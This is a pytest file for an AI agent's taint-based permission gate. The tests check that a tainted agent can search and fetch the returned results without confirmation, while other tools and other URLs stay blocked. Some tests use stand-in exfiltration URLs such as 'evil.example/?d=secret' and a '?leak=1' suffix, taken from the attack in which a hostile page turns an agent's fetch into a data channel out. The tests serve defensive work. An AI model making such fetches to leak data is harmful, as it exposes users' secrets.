"""Safe research: a tainted agent can search and read its search results
without a YES per page, and nothing else gets easier.

The Phase 3.5 gate showed each `web.fetch` after a search asking for YES,
because the search taints the agent. The only calls relaxed are the ones a
hostile page cannot turn into a channel out: `web.search` (the query goes to
the search provider) and `web.fetch` of a URL that search returned.
"""
from __future__ import annotations

import pytest

from sable.tools import registry, web
from sable.tools.base import ToolContext

RESULTS = [
    {"title": "Advisory", "url": "https://nginx.org/en/security_advisories.html", "snippet": "s"},
    {"title": "CVE", "url": "https://www.cve.org/CVERecord?id=CVE-2024-7347#top", "snippet": "s"},
]


@pytest.fixture
def offline(monkeypatch):
    monkeypatch.setattr(web, "search", lambda q, k=5: RESULTS)
    monkeypatch.setattr(web, "fetch", lambda url, max_bytes=0: f"url: {url}\n\npage text")


def _ctx(seen, tainted=True, role="worker"):
    return ToolContext(role=role, cwd=".", agent="a", tainted=tainted, seen_urls=seen)


def test_search_while_tainted_needs_no_yes(offline, monkeypatch):
    monkeypatch.setattr("builtins.input", lambda *_: pytest.fail("asked for YES"))
    seen = set()
    assert registry.call("web.search", {"query": "nginx cve"}, _ctx(seen)).ok
    assert "https://nginx.org/en/security_advisories.html" in seen
    assert "https://www.cve.org/CVERecord?id=CVE-2024-7347" in seen   # fragment dropped


def test_fetching_a_search_result_while_tainted_needs_no_yes(offline, monkeypatch):
    monkeypatch.setattr("builtins.input", lambda *_: pytest.fail("asked for YES"))
    seen = set()
    registry.call("web.search", {"query": "nginx cve"}, _ctx(seen))
    r = registry.call("web.fetch", {"url": "https://nginx.org/en/security_advisories.html"}, _ctx(seen))
    assert r.ok and r.taints


def test_a_url_the_search_did_not_return_is_still_bumped(offline):
    """A worker is never prompted, so a bumped call is refused outright."""
    seen = set()
    registry.call("web.search", {"query": "nginx cve"}, _ctx(seen))
    r = registry.call("web.fetch", {"url": "https://evil.example/?d=secret"}, _ctx(seen))
    assert not r.ok and "blocked" in r.output


def test_a_search_result_with_data_appended_is_still_bumped(offline):
    seen = set()
    registry.call("web.search", {"query": "nginx cve"}, _ctx(seen))
    r = registry.call("web.fetch", {"url": "https://nginx.org/en/security_advisories.html?leak=1"}, _ctx(seen))
    assert not r.ok


def test_other_tools_are_still_bumped_while_tainted():
    r = registry.call("echo", {"text": "x"}, _ctx(set()))
    assert not r.ok   # allow -> confirm, and a worker cannot confirm


def test_without_a_seen_set_nothing_is_exempt(offline):
    r = registry.call("web.fetch", {"url": "https://nginx.org/en/security_advisories.html"}, _ctx(None))
    assert not r.ok
